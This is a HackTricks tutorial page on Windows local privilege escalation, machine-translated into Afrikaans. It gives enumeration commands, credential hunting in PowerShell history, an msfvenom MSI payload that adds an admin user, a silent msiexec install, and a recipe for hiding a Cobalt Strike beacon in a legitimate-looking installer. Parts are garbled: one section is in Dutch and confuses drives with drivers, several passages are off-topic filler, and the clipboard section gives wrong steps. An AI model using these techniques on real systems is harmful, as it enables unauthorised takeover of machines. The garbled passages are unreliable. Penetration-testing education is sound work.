# Windows Plaaslike Bevoorregting Verhoging

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Die beste instrument om te soek na Windows plaaslike bevoorregting verhoging vektore:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Aanvanklike Windows Teorie

### Toegangstokens

**As jy nie weet wat Windows-toegangstokens is nie, lees die volgende bladsy voordat jy voortgaan:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL's - DACL's/SACL's/ACE's

**Kyk na die volgende bladsy vir meer inligting oor ACL's - DACL's/SACL's/ACE's:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Integriteitsvlakke

**As jy nie weet wat integriteitsvlakke in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows Sekuriteitsbeheer

Daar is verskillende dinge in Windows wat jou kan **verhoed om die stelsel op te som**, uitvoerbare lêers uit te voer of selfs jou aktiwiteite te **opspoor**. Jy moet die volgende **bladsy** lees en al hierdie **verdedigingsmeganismes** **ondersoek** voordat jy met die bevoorregting verhoging ondersoek begin:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Stelsel Inligting

### Weergawe-inligting ondersoek

Kyk of die Windows-weergawe enige bekende kwesbaarheid het (ondersoek ook die gepatchte weergawes).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Weergawe-uitbuitings

Hierdie [webwerf](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede op te soek. Hierdie databasis het meer as 4,700 sekuriteitskwesbaarhede, wat die **massiewe aanvalsoppervlak** wat 'n Windows-omgewing bied, toon.

**Op die stelsel**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebed)_

**Lokaal met stelselinligting**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-opslagplekke van uitbuitings:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Enige geloofsbriewe/sappige inligting wat in die omgewingsveranderlikes gestoor is?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell Geskiedenis

PowerShell hou 'n geskiedenis van die opdragte wat jy in die verlede uitgevoer het. Hierdie geskiedenis kan nuttig wees vir verskeie doeleindes, soos die herhaal van vorige opdragte, die ondersoek van vorige aktiwiteite en die opspoor van foutopsporing.

Om die geskiedenis van PowerShell-opdragte te sien, kan jy die `Get-History` opdrag gebruik. Hierdie opdrag sal 'n lys van vorige opdragte toon, elk met 'n unieke ID en die opdrag self.

Om 'n vorige opdrag te herhaal, kan jy die `Invoke-History` opdrag gebruik, gevolg deur die ID van die opdrag wat jy wil herhaal. Byvoorbeeld, as die ID van die opdrag 5 is, kan jy die volgende opdrag uitvoer: `Invoke-History -Id 5`.

Daar is ook ander nuttige opdragte wat jy kan gebruik om die geskiedenis van PowerShell te manipuleer. Byvoorbeeld, jy kan die `Clear-History` opdrag gebruik om die geskiedenis te skoonmaak en alle vorige opdragte te verwyder.

Dit is belangrik om bewus te wees van die geskiedenis van PowerShell-opdragte, veral as jy met gevoelige inligting werk. Maak seker dat jy die nodige voorsoorsorgmaatreëls tref om te verseker dat jou opdragte en aktiwiteite veilig en privaat bly.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript-lêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell-pyplynuitvoerings word aangeteken, wat uitgevoerde opdragte, opdragoproepings en dele van skripte insluit. Volledige uitvoeringsbesonderhede en uitsetresultate word egter moontlik nie vasgevang nie.

Om dit moontlik te maak, volg die instruksies in die "Transkripsie-lêers" afdeling van die dokumentasie en kies vir **"Module Logging"** in plaas van **"Powershell Transkripsie"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeure van Powershell-logboeke te sien, kan jy die volgende uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Skripsiebloklogging**

'n Volledige aktiwiteits- en volledige inhoudsrekord van die skripsie se uitvoering word vasgevang, wat verseker dat elke blok kode gedokumenteer word terwyl dit loop. Hierdie proses behou 'n omvattende ouditbaan van elke aktiwiteit, wat waardevol is vir forensiese ondersoek en die analise van skadelike gedrag. Deur alle aktiwiteit tydens die uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Die loggebeure vir die Skripsblok kan gevind word binne die Windows-gebeurtenisleser by die pad: **Toepassing en Dienste Logboeke > Microsoft > Windows > PowerShell > Operasioneel**.\
Om die laaste 20 gebeure te sien, kan jy gebruik maak van:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internetinstellings

Hierdie gedeelte dek verskillende internetinstellings wat gebruik kan word vir Windows-hardening. Dit sluit die volgende in:

#### Internet Explorer Enhanced Security Configuration (IE ESC)

Internet Explorer Enhanced Security Configuration (IE ESC) is 'n funksie wat standaard geaktiveer is op Windows-bedieners. Dit beperk die risiko van aanvalle deur die beperking van die webblaaier se funksionaliteit. Hier is 'n paar maniere om IE ESC te konfigureer:

- **Uitskakel vir Administrateurs**: Hierdie opsie skakel IE ESC af vir gebruikers wat as administrateurs aangemeld is.
- **Uitskakel vir Gebruikers**: Hierdie opsie skakel IE ESC af vir alle gebruikers, insluitend administrateurs.
- **Aanpas vir Administrateurs**: Hierdie opsie laat administrateurs toe om IE ESC-instellings te konfigureer vir gebruikers.
- **Aanpas vir Gebruikers**: Hierdie opsie laat gebruikers toe om hul eie IE ESC-instellings te konfigureer.

#### Windows Defender SmartScreen

Windows Defender SmartScreen is 'n funksie wat ontwerp is om gebruikers te beskerm teen skadelike inhoud en onveilige webwerwe. Dit kan geaktiveer of gedeaktiveer word deur die volgende stappe te volg:

1. Klik op die **Start**-knoppie en kies **Instellings**.
2. Kies **Beskerming en sekuriteit** en dan **Windows Defender Security Center**.
3. Klik op **App- en broserbeheer** en skakel die **Windows Defender SmartScreen**-opsie aan of af.

#### Windows Firewall

Windows Firewall is 'n ingeboude sekuriteitsfunksie wat inkomende en uitgaande netwerkverkeer beheer. Dit kan gekonfigureer word deur die volgende stappe te volg:

1. Klik op die **Start**-knoppie en kies **Instellings**.
2. Kies **Netwerk en internet** en dan **Status**.
3. Klik op **Windows Firewall** en kies die gewenste opsies vir inkomende en uitgaande verbindings.

#### Windows Update

Windows Update is 'n funksie wat gebruik word om Windows-bedieners op te dateer met die nuutste beveiligingspatches en opdaterings. Dit kan gekonfigureer word deur die volgende stappe te volg:

1. Klik op die **Start**-knoppie en kies **Instellings**.
2. Kies **Beskerming en sekuriteit** en dan **Windows Update**.
3. Klik op **Geavanceerde opsies** en kies die gewenste opsies vir die installering van opdaterings.

#### Remote Desktop Protocol (RDP)

Remote Desktop Protocol (RDP) is 'n funksie wat toegang tot 'n rekenaar op afstand bied. Dit kan gekonfigureer word deur die volgende stappe te volg:

1. Klik op die **Start**-knoppie en kies **Instellings**.
2. Kies **Systeem** en dan **Ver af**.
3. Klik op **Remote Desktop** en kies die gewenste opsies vir RDP-toegang.

#### PowerShell Execution Policy

PowerShell Execution Policy is 'n beveiligingsfunksie wat bepaal watter tipes PowerShell-skripte op 'n stelsel uitgevoer kan word. Dit kan gekonfigureer word deur die volgende stappe te volg:

1. Open 'n PowerShell-venster as 'n administrateur.
2. Voer die volgende opdrag in: `Set-ExecutionPolicy <beleid>`, waar `<beleid>` die gewenste beleid is (byvoorbeeld `Restricted`, `AllSigned`, `RemoteSigned`, `Unrestricted`).

#### User Account Control (UAC)

User Account Control (UAC) is 'n funksie wat ontwerp is om die veiligheid van 'n stelsel te verhoog deur beheerderstoegang te vereis vir sekere aksies. Dit kan gekonfigureer word deur die volgende stappe te volg:

1. Klik op die **Start**-knoppie en kies **Instellings**.
2. Kies **Rekenaarrekeninge** en dan **Gebruikersrekeninge**.
3. Klik op **Wysig die gebruikersrekeningbeheerinstellings** en kies die gewenste UAC-instelling.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Bestuurders

#### Inleiding

In Windows is een bestuurder een softwarecomponent die communicatie mogelijk maakt tussen het besturingssysteem en de hardware of virtuele apparaten. Bestuurders spelen een cruciale rol bij het functioneren van het systeem en kunnen soms kwetsbaarheden bevatten die kunnen worden misbruikt om lokale bevoegdheden te verhogen.

#### Lokale bevoegdheidsverhoging via bestuurders

Het verkrijgen van lokale bevoegdheidsverhoging via bestuurders is een veelvoorkomende techniek die wordt gebruikt door aanvallers. Hier zijn enkele veelvoorkomende methoden om dit te bereiken:

1. **Kwetsbare bestuurders**: Sommige bestuurders kunnen kwetsbaarheden bevatten die kunnen worden misbruikt om bevoegdheden te verhogen. Het is belangrijk om op de hoogte te blijven van bekende kwetsbaarheden in bestuurders en ervoor te zorgen dat ze up-to-date zijn.

2. **Onveilige bestuurdersinstallaties**: Aanvallers kunnen misbruik maken van onveilige bestuurdersinstallaties om bevoegdheden te verhogen. Dit kan bijvoorbeeld gebeuren als een bestuurder wordt geïnstalleerd met onjuiste beveiligingsinstellingen.

3. **Bestuurdersignatuurcontrole omzeilen**: Windows voert een handtekeningcontrole uit op bestuurders om ervoor te zorgen dat alleen vertrouwde bestuurders worden geladen. Aanvallers kunnen proberen deze controle te omzeilen door een ondertekende bestuurder te vervangen door een kwaadaardige versie.

#### Beveiligingsmaatregelen

Om lokale bevoegdheidsverhoging via bestuurders te voorkomen, kunnen de volgende beveiligingsmaatregelen worden genomen:

1. **Houd bestuurders up-to-date**: Zorg ervoor dat alle bestuurders up-to-date zijn en dat eventuele bekende kwetsbaarheden zijn gepatcht.

2. **Installeer bestuurders van vertrouwde bronnen**: Download en installeer bestuurders alleen van vertrouwde bronnen om het risico op het installeren van kwaadaardige bestuurders te verminderen.

3. **Controleer bestuurdershandtekeningen**: Schakel de handtekeningcontrole voor bestuurders niet uit en controleer altijd de handtekeningen van bestuurders voordat ze worden geladen.

4. **Beperk bestuurdersrechten**: Beperk de rechten van bestuurders om te voorkomen dat ze ongeautoriseerde wijzigingen kunnen aanbrengen in het systeem.

#### Conclusie

Het beveiligen van bestuurders is essentieel om lokale bevoegdheidsverhoging te voorkomen. Door bestuurders up-to-date te houden, alleen bestuurders van vertrouwde bronnen te installeren en bestuurdershandtekeningen te controleren, kunnen organisaties hun systemen beschermen tegen aanvallen die gebruikmaken van kwetsbaarheden in bestuurders.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer as die opdaterings nie deur http**S** nie, maar deur http aangevra word.

Jy begin deur te kyk of die netwerk 'n nie-SSL WSUS-opdatering gebruik deur die volgende uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
As jy 'n antwoord soos die volgende kry:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` gelyk is aan `1`.

Dan is **dit vatbaar vir uitbuiting.** As die laaste register gelyk is aan 0, sal die WSUS inskrywing geïgnoreer word.

Om hierdie kwesbaarhede uit te buit, kan jy gereedskap soos [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) gebruik - Dit is MiTM-gewapende uitbuitingskrips wat 'n 'vals' opdatering in nie-SSL WSUS-verkeer inspuit.

Lees die navorsing hier:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Lees die volledige verslag hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basies is hierdie die fout wat hierdie fout uitbuit:

> As ons die mag het om ons plaaslike gebruikersproksi te wysig, en Windows Updates gebruik die proksi wat in Internet Explorer se instellings gekonfigureer is, het ons dus die mag om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te hardloop om ons eie verkeer te onderskep en kode as 'n verhoogde gebruiker op ons bate uit te voer.
>
> Verder, aangesien die WSUS-diens die huidige gebruiker se instellings gebruik, sal dit ook sy sertifikaatstoor gebruik. As ons 'n self-ondertekende sertifikaat vir die WSUS-hostnaam genereer en hierdie sertifikaat by die huidige gebruiker se sertifikaatstoor voeg, sal ons beide HTTP- en HTTPS-WSUS-verkeer kan onderskep. WSUS gebruik geen HSTS-soort meganismes om 'n vertrou-op-eerste-gebruik-tipe validering op die sertifikaat te implementeer nie. As die aangebiede sertifikaat deur die gebruiker vertrou word en die korrekte hostnaam het, sal dit deur die diens aanvaar word.

Jy kan hierdie kwesbaarheid uitbuit deur die gereedskap [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) te gebruik (sodra dit vrygestel is).

## KrbRelayUp

'n **Plaaslike voorregverhoging**-kwesbaarheid bestaan in Windows **domein**-omgewings onder spesifieke omstandighede. Hierdie omstandighede sluit omgewings in waar **LDAP-ondertekening nie afgedwing word nie,** gebruikers self-regte besit wat hulle in staat stel om **Hulpbron-Gebaseerde Beperkte Delegasie (RBCD)** te konfigureer, en die vermoë vir gebruikers om rekenaars binne die domein te skep. Dit is belangrik om daarop te let dat hierdie **vereistes** voldoen word deur **standaardinstellings** te gebruik.

Vind die uitbuiting in [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die vloei van die aanval, kyk na [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 registers **geaktiveer** is (waarde is **0x1**), kan gebruikers met enige voorreg `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **installeer** (uitvoer).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit vragte

Metasploit is 'n kragtige raamwerk vir penetrasietoetse wat 'n verskeidenheid van vragte bied om te gebruik tydens 'n aanval. Hier is 'n paar van die mees gebruikte Metasploit vragte:

- **reverse_tcp**: Hierdie vrag maak 'n verbinding met die aanvaller se masjien en stuur 'n omgekeerde TCP-verbinding om beheer oor die teikenstelsel te verkry.
- **bind_tcp**: Hierdie vrag luister op 'n spesifieke poort op die teikenstelsel en wag vir die aanvaller om 'n TCP-verbinding te maak en beheer oor die stelsel te verkry.
- **reverse_http**: Hierdie vrag maak 'n verbinding met die aanvaller se masjien en stuur 'n omgekeerde HTTP-verbinding om beheer oor die teikenstelsel te verkry.
- **reverse_https**: Hierdie vrag maak 'n verbinding met die aanvaller se masjien en stuur 'n omgekeerde HTTPS-verbinding om beheer oor die teikenstelsel te verkry.
- **reverse_tcp_dns**: Hierdie vrag maak 'n verbinding met die aanvaller se masjien en stuur 'n omgekeerde TCP-verbinding oor die DNS-protokol om beheer oor die teikenstelsel te verkry.

Dit is slegs 'n paar voorbeelde van die vragte wat beskikbaar is in Metasploit. Elke vrag het sy eie unieke funksionaliteit en kan gebruik word vir verskillende aanvalscenario's.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy 'n meterpreter-sessie het, kan jy hierdie tegniek outomatiseer deur die module **`exploit/windows/local/always_install_elevated`** te gebruik.

### PowerUP

Gebruik die `Write-UserAddMSI`-opdrag van power-up om binne die huidige gids 'n Windows MSI-binêre lêer te skep om voorregte te verhoog. Hierdie skripsie skryf 'n vooraf gekompileerde MSI-installeerder wat vra vir 'n gebruiker/groep byvoeging (so jy sal GUI-toegang benodig):
```
Write-UserAddMSI
```
Voer net die geskepte binêre lêer uit om voorregte te verhoog.

### MSI Wrapper

Lees hierdie handleiding om te leer hoe om 'n MSI-wrapper te skep met behulp van hierdie hulpmiddels. Let daarop dat jy 'n "**.bat**" lêer kan omsluit as jy net wil **opdragreëls uitvoer**.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Skep MSI met WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Skep MSI met Visual Studio

* **Genereer** met Cobalt Strike of Metasploit 'n **nuwe Windows EXE TCP-lading** in `C:\privesc\beacon.exe`
* Maak **Visual Studio** oop, kies **Skep 'n nuwe projek** en tik "installer" in die soekbalk. Kies die **Setup Wizard**-projek en klik **Volgende**.
* Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **plaas oplossing en projek in dieselfde gids** en klik **Skep**.
* Klik steeds **Volgende** totdat jy by stap 3 van 4 (kies lêers om in te sluit) kom. Klik **Voeg by** en kies die Beacon-lading wat jy net gegenereer het. Klik dan **Voltooi**.
* Lig die **AlwaysPrivesc**-projek in die **Solution Explorer** uit en verander in die **Eienskappe** die **TargetPlatform** van **x86** na **x64**.
* Daar is ander eienskappe wat jy kan verander, soos die **Author** en **Manufacturer**, wat die geïnstalleerde program meer legitiem kan laat lyk.
* Regskliek op die projek en kies **View > Custom Actions**.
* Regskliek op **Install** en kies **Add Custom Action**.
* Dubbelklik op **Application Folder**, kies jou **beacon.exe**-lêer en klik **OK**. Dit sal verseker dat die Beacon-lading uitgevoer word sodra die installeerder uitgevoer word.
* Verander **Run64Bit** na **True** onder die **Custom Action Properties**.
* Laastens, **bou dit**.
* As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` getoon word, maak seker dat jy die platform na x64 stel.

### MSI-installasie

Om die bosewillige `.msi`-lêer in die **agtergrond** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid uit te buit, kan jy gebruik maak van: _exploit/windows/local/always\_install\_elevated_

## Antivirus en Detectors

### Ouditinstellings

Hierdie instellings besluit wat **geregistreer** word, so jy moet aandag gee
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, is interessant om te weet waar die lêers gestuur word.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrateur wagwoorde**, wat verseker dat elke wagwoord **uniek, willekeurig en gereeld opgedateer** word op rekenaars wat by 'n domein aangesluit is. Hierdie wagwoorde word veilig binne Active Directory gestoor en kan slegs deur gebruikers wat voldoende toestemmings deur ACL's verkry het, toegang verkry word. Dit stel hulle in staat om plaaslike administrateur wagwoorde te sien as hulle geautoriseer is.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Indien aktief, word **plain-tekswagwoorde in LSASS** (Local Security Authority Subsystem Service) gestoor.\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA-beskerming

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) ingevoer om pogings deur onbetroubare prosesse te **blokkeer** om sy geheue te **lees** of kode in te spuit, wat die stelsel verder beveilig.\
[**Meer inligting oor LSA-beskerming hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is in **Windows 10** geïntroduceer. Dit doel is om die geloofsbriewe wat op 'n toestel gestoor word teen bedreigings soos pass-the-hash aanvalle te beskerm.|
[**Meer inligting oor Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Gekashte Geldele

**Domein-geldele** word geverifieer deur die **Plaaslike Sekuriteitsowerheid** (LSA) en word deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se aanmeldingsdata geverifieer word deur 'n geregistreerde sekuriteitspakket, word gewoonlik domein-geldele vir die gebruiker gevestig.\
[**Meer inligting oor Gekashte Geldele hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Enumereer Gebruikers & Groepe

Jy moet nagaan of enige van die groepe waar jy deel van uitmaak interessante regte het.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy deel is van 'n bevoorregte groep, kan jy moontlik voorregte verhoog. Leer meer oor bevoorregte groepe en hoe om hulle te misbruik om voorregte te verhoog hier:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token manipulasie

Leer meer oor wat 'n token is op hierdie bladsy: [Windows Tokens](../authentication-credentials-uac-and-efs.md#access-tokens).\
Kyk na die volgende bladsy om meer te leer oor interessante tokens en hoe om hulle te misbruik:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Aangetekende gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuisgids

Die tuisgids is 'n belangrike plek om te kyk vir moontlike aanvalsveilighede. Dit is die plek waar gebruikers se persoonlike lêers en instellings gestoor word. As 'n aanvaller toegang tot 'n gebruiker se tuisgids kry, kan dit lei tot bevoorregte eskalasie.

#### Tuisgidslokasie

Die tuisgidslokasie kan verskil afhangende van die Windows-weergawe:

- Windows XP/2003: `C:\Documents and Settings\Gebruikersnaam`
- Windows Vista/7/8/10/2012/2016/2019: `C:\Gebruikers\Gebruikersnaam`

#### Moontlike aanvalsveilighede

Daar is verskeie moontlike aanvalsveilighede wat verband hou met die tuisgids:

1. Wagtwoordlek: As 'n aanvaller toegang tot 'n gebruiker se tuisgids kry, kan hy moontlik wagtwoorde vind wat in konfigurasie- of toepassingslêers gestoor word.
2. Bevoorregte eskalasie: As 'n aanvaller toegang tot 'n gebruiker se tuisgids kry, kan hy probeer om bevoorregte toegang te verkry deur die instellings of konfigurasie van die gebruiker te manipuleer.
3. Uitvoering van kwaadwillige kode: As 'n aanvaller toegang tot 'n gebruiker se tuisgids kry, kan hy kwaadwillige kode plaas wat uitgevoer word as die gebruiker aanmeld.

#### Beveiligingsmaatreëls

Om die risiko van aanvalsveilighede in die tuisgids te verminder, kan die volgende beveiligingsmaatreëls geïmplementeer word:

1. Beperk toegang: Beperk die toegang tot die tuisgids tot slegs die gebruiker en beheerder.
2. Sterk wagwoorde: Verseker dat gebruikers sterk wagwoorde gebruik om die risiko van wagtwoordlekke te verminder.
3. Beperk uitvoering: Beperk die uitvoering van uitvoerbare lêers in die tuisgids om die risiko van kwaadwillige kode-uitvoering te verminder.
4. Monitor aktiwiteit: Monitor die aktiwiteit in die tuisgids om verdagte gedrag te identifiseer en te voorkom.

Deur hierdie beveiligingsmaatreëls te implementeer, kan die risiko van aanvalsveilighede in die tuisgids verminder word.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid

'n Wagwoordbeleid is 'n belangrike aspek van die beveiliging van 'n Windows-stelsel. Dit stel riglyne en vereistes vir die keuse en gebruik van wagwoorde deur gebruikers. Hier is 'n paar belangrike punte om in gedagte te hou:

- **Wagwoordlengte**: Die beleid moet 'n minimum wagwoordlengte vereis, soos byvoorbeeld 8 karakters.
- **Kompleksiteit**: Die wagwoord moet 'n mengsel van hoofletters, kleinletters, syfers en spesiale karakters vereis.
- **Wagwoordverval**: Dit is raadsaam om 'n beleid te hê wat vereis dat gebruikers hul wagwoorde gereeld verander, byvoorbeeld elke 90 dae.
- **Wagwoordhergebruik**: Gebruikers moet verbied word om vorige wagwoorde te hergebruik.
- **Rekeningblokkering**: Na 'n sekere aantal mislukte aanmeldpogings moet die rekening tydelik geblokkeer word om te beskerm teen aanvalle soos 'n brutedorce-aanval.

Deur 'n streng wagwoordbeleid te implementeer, kan die risiko van wagwoordgebaseerde aanvalle verminder word en die algehele beveiliging van die stelsel verbeter word.
```bash
net accounts
```
### Kry die inhoud van die knipbord

Om die inhoud van die knipbord in Windows te kry, kan jy die volgende stappe volg:

1. Open 'n nuwe teksdokument of enige ander toepassing waarin jy teks kan invoer.
2. Druk die `Ctrl` + `V` sleutels op jou sleutelbord om die inhoud van die knipbord in te voeg.
